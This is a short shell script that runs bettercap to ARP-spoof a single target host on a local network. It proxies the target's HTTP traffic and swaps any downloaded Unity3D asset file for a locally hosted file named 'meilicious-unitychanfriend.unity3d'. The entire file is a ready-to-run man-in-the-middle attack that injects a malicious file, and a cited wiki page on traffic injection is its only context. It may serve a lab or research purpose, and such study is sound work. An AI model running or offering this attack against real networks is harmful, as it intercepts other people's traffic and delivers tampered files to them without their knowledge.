#!/bin/sh
# https://charlesreid1.com/wiki/Man_in_the_Middle/Traffic_Injection

bettercap -I eth0  -S ARP -X \
    --proxy --proxy-module replace_file \
    --httpd --httpd-path / \
    --file-replace basic/meilicious-unitychanfriend.unity3d \
    --file-extension unity3d \
    --gateway 192.168.23.1 --target 192.168.23.12
